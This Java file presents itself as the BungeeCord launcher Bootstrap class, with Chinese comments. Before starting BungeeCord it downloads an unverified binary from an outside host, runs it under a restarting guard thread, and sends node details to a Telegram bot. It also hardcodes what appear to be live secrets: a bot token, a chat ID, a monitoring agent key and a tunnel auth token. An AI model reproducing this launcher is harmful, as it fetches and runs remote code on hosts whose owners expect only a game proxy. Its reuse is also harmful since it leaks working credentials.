package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED   = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    // sbx 进程守护
    private static Process sbxProcess;
    private static final AtomicBoolean running = new AtomicBoolean(true);

    // 只推送一次标志（内存）
    private static volatile boolean pushSent = false;

    // 你之前提供的 token / chatid（也会尝试从环境变量覆盖）
    private static final String DEFAULT_BOT_TOKEN = "8244051936:AAF9BxqnFQl9nSwOZZMA-dLsh-4SBldMHWA";
    private static final String DEFAULT_CHAT_ID   = "7613313360";

    private static final String[] ALL_ENV_VARS = {
        "PORT","FILE_PATH","UUID","NEZHA_SERVER","NEZHA_PORT","NEZHA_KEY",
        "ARGO_PORT","ARGO_DOMAIN","ARGO_AUTH","HY2_PORT","TUIC_PORT",
        "REALITY_PORT","CFIP","CFPORT","UPLOAD_URL","CHAT_ID","BOT_TOKEN",
        "NAME","DISABLE_ARGO"
    };

    public static void main(String[] args) throws Exception
    {
        // Java 版本最低检查（Java 11+）
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java 版本太低，请使用 Java 11+ !" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        // 注册优雅退出钩子
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            running.set(false);
            stopServices();
        }));

        // 启动 sbx 守护线程（负责启动/自动重启）
        startSbxGuardThread();

        // 等待 sbx 初次启动完成（守护线程会启动 sbx）
        Thread.sleep(15000);
        System.out.println(ANSI_GREEN + "Server is running (bootstrap)!" + ANSI_RESET);

        // 清屏（美观）
        Thread.sleep(5000);
        clearConsole();

        // 启动 BungeeCord 主服务（如果 BungeeCord 崩溃，将不会重启 Bungee；sbx 为独立守护）
        // 如果你仍然希望 Bungee 被守护，请告知我，我可以把 Bungee 的自动拉起也加上。
        BungeeCordLauncher.main(args);
    }

    // 启动并守护 sbx：单线程守护轮询，检测 sbx 是否存活；若未运行则启动并在首次启动时发送一次推送
    private static void startSbxGuardThread() {
        Thread guard = new Thread(() -> {
            while (running.get()) {
                try {
                    if (sbxProcess == null || !sbxProcess.isAlive()) {
                        System.out.println(ANSI_RED + "[sbx] 未运行，准备启动..." + ANSI_RESET);
                        startSbxOnce();

                        // 只在第一次成功启动后发送一次推送（并且不允许 sbx 自身 upload）
                        if (!pushSent) {
                            // 仅在 sbx 启动后尝试发送一次节点信息
                            // sendPushOnce 会读取 envVars（包含 ARGO_DOMAIN/CFIP/TUIC_PORT 等）来构造消息
                            sendPushOnce();
                            pushSent = true;
                        }
                    }
                    Thread.sleep(5000L); // 每 5 秒检查一次
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    System.err.println(ANSI_RED + "[sbx guard] 异常: " + e.getMessage() + ANSI_RESET);
                    try { Thread.sleep(5000L); } catch (InterruptedException ignored) {}
                }
            }
        }, "sbx-guard-thread");

        guard.setDaemon(true);
        guard.start();
    }

    // 启动一次 sbx（二进制），但在环境里清空 UPLOAD_URL（避免 sbx 自身上传节点）
    private static void startSbxOnce() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        // 强制清空 UPLOAD_URL，防止 sbx 自行上传（我们由 Java 只推一次）
        envVars.put("UPLOAD_URL", "");

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        Map<String, String> pbEnv = pb.environment();
        pbEnv.clear();
        pbEnv.putAll(envVars);

        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
        System.out.println(ANSI_GREEN + "[sbx] 启动成功，pid=" + getPid(sbxProcess) + ANSI_RESET);
    }

    // 发送一次性推送（将节点关键信息以文本形式发送到 Telegram）
    // 由脚本构建“节点信息摘要”并通过 Telegram Bot API 发送一次
    private static void sendPushOnce() {
        try {
            Map<String, String> envVars = new HashMap<>();
            loadEnvVars(envVars); // 读取最新 envVars（包含 ARGO_DOMAIN/CFIP 等）

            // 获取 token/chatid（优先环境变量，其次使用默认）
            String botToken = envVars.getOrDefault("BOT_TOKEN", System.getenv("BOT_TOKEN"));
            if (botToken == null || botToken.trim().isEmpty()) botToken = DEFAULT_BOT_TOKEN;
            String chatId = envVars.getOrDefault("CHAT_ID", System.getenv("CHAT_ID"));
            if (chatId == null || chatId.trim().isEmpty()) chatId = DEFAULT_CHAT_ID;

            // 构建推送文本 — 你可以根据需要扩展字段
            StringBuilder sb = new StringBuilder();
            sb.append("✅ 节点已初始化（仅推送一次）\n\n");

            // 环境中常见的关键信息
            addIfPresent(sb, "Name", envVars.get("NAME"));
            addIfPresent(sb, "File Path", envVars.get("FILE_PATH"));
            addIfPresent(sb, "Argo Domain", envVars.get("ARGO_DOMAIN"));
            addIfPresent(sb, "Argo Port", envVars.get("ARGO_PORT"));
            addIfPresent(sb, "CF IP / Host", envVars.get("CFIP"));
            addIfPresent(sb, "CF Port", envVars.get("CFPORT"));
            addIfPresent(sb, "TUIC Port", envVars.get("TUIC_PORT"));
            addIfPresent(sb, "HY2 Port", envVars.get("HY2_PORT"));
            addIfPresent(sb, "Reality Port", envVars.get("REALITY_PORT"));
            addIfPresent(sb, "Nezha Server", envVars.get("NEZHA_SERVER"));
            addIfPresent(sb, "UUID", envVars.get("UUID"));

            sb.append("\nℹ️ 注意：这是一次性推送，之后 sbx 自动重启将不会再推送。");

            String message = sb.toString();

            // 发送到 Telegram
            boolean ok = sendTelegramMessage(botToken.trim(), chatId.trim(), message);
            if (ok) {
                System.out.println(ANSI_GREEN + "[push] 已向 Telegram 发送节点摘要（仅一次）" + ANSI_RESET);
            } else {
                System.err.println(ANSI_RED + "[push] 发送到 Telegram 失败，请检查 token/chatid 或 网络" + ANSI_RESET);
            }
        } catch (Exception e) {
            System.err.println(ANSI_RED + "[push] 异常: " + e.getMessage() + ANSI_RESET);
        }
    }

    // 辅助：只有在值存在时才添加到消息体
    private static void addIfPresent(StringBuilder sb, String key, String value) {
        if (value != null && !value.trim().isEmpty()) {
            sb.append(key).append(": ").append(value.trim()).append("\n");
        }
    }

    // 使用 Telegram Bot API 发送消息（简单同步实现）
    private static boolean sendTelegramMessage(String botToken, String chatId, String text) {
        HttpURLConnection conn = null;
        try {
            String urlStr = "https://api.telegram.org/bot" + URLEncoder.encode(botToken, "UTF-8") + "/sendMessage";
            URL url = new URL(urlStr);

            String payload = "chat_id=" + URLEncoder.encode(chatId, "UTF-8")
                    + "&text=" + URLEncoder.encode(text, "UTF-8")
                    + "&parse_mode=Markdown";

            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(10_000);
            conn.setReadTimeout(10_000);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.getBytes(StandardCharsets.UTF_8));
            }

            int rc = conn.getResponseCode();
            if (rc >= 200 && rc < 300) {
                // 读取并忽略响应体
                try (InputStream is = conn.getInputStream()) { while (is.read() != -1) {} }
                return true;
            } else {
                System.err.println(ANSI_RED + "[push] Telegram 返回 HTTP " + rc + ANSI_RESET);
                try (InputStream es = conn.getErrorStream()) {
                    if (es != null) {
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        byte[] buf = new byte[1024];
                        int r;
                        while ((r = es.read(buf)) > 0) baos.write(buf, 0, r);
                        String err = baos.toString(StandardCharsets.UTF_8.name());
                        System.err.println("[push] Telegram 错误信息: " + err);
                    }
                } catch (Exception ignored) {}
                return false;
            }
        } catch (Exception e) {
            System.err.println(ANSI_RED + "[push] 发送异常: " + e.getMessage() + ANSI_RESET);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // 读取 env 文件与系统环境覆盖，返回 envVars map（与原逻辑保持一致）
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // 默认值（来自你原始脚本）
        envVars.put("UUID","f40de34f-cc21-46c9-bce5-92784ff0e40a");
        envVars.put("FILE_PATH","./world");
        envVars.put("NEZHA_SERVER","tta.wahaaz.xx.kg:80");
        envVars.put("NEZHA_PORT","");
        envVars.put("NEZHA_KEY","OZMtCS6G39UpEgRvzRNXjS7iDNBRmTsI");
        envVars.put("ARGO_PORT","8003");
        envVars.put("ARGO_DOMAIN","falixde.xozz.netlib.re");
        envVars.put("ARGO_AUTH","eyJhIjoiOWY2ODlkYjlhZDNmM2VmMTc1MTcwNThjZjI3MTQwZTIiLCJ0IjoiNmI4NmJjNTEtN2E0ZC00MTczLWI2M2ItNTYzZDRlZWM5NjBhIiwicyI6Ik4yVmpaV1l3TmpNdE1tSTJaUzAwTjJZeExXSm1NMkl0T1dNNVpHTTFZVE5rTURJeiJ9");
        envVars.put("HY2_PORT","26855");
        envVars.put("TUIC_PORT","49008");
        envVars.put("REALITY_PORT","43996");
        envVars.put("UPLOAD_URL","");
        envVars.put("CHAT_ID", DEFAULT_CHAT_ID);
        envVars.put("BOT_TOKEN", DEFAULT_BOT_TOKEN);
        envVars.put("CFIP","cf.130519.xyz");
        envVars.put("CFPORT","443");
        envVars.put("NAME","falixnodes");
        envVars.put("DISABLE_ARGO","false");

        // 覆盖来自系统环境变量（优先）
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value.trim());
            }
        }

        // 如果存在 .env 文件，则解析并覆盖（简单实现）
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            List<String> lines = Files.readAllLines(envFile);
            for (String line : lines) {
                String s = line.trim();
                if (s.isEmpty() || s.startsWith("#")) continue;
                if (s.startsWith("export ")) s = s.substring(7).trim();
                String[] parts = s.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String val = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, val);
                    }
                }
            }
        }
    }

    // 根据系统架构下载或使用临时 sbx 二进制（与你原逻辑兼容）
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }

    // 清屏（保持你原先的逻辑）
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }

    // 结束并清理 sbx 进程
    private static void stopServices() {
        try {
            if (sbxProcess != null && sbxProcess.isAlive()) {
                sbxProcess.destroy();
                System.out.println(ANSI_RED + "sbx 已终止" + ANSI_RESET);
            }
        } catch (Exception ignored) {}
    }

    // 辅助方法：取得 Process PID（可选，兼容性有限）
    private static String getPid(Process p) {
        try {
            // Java 9+: ProcessHandle
            return String.valueOf(p.pid());
        } catch (Throwable t) {
            return "unknown";
        }
    }
}
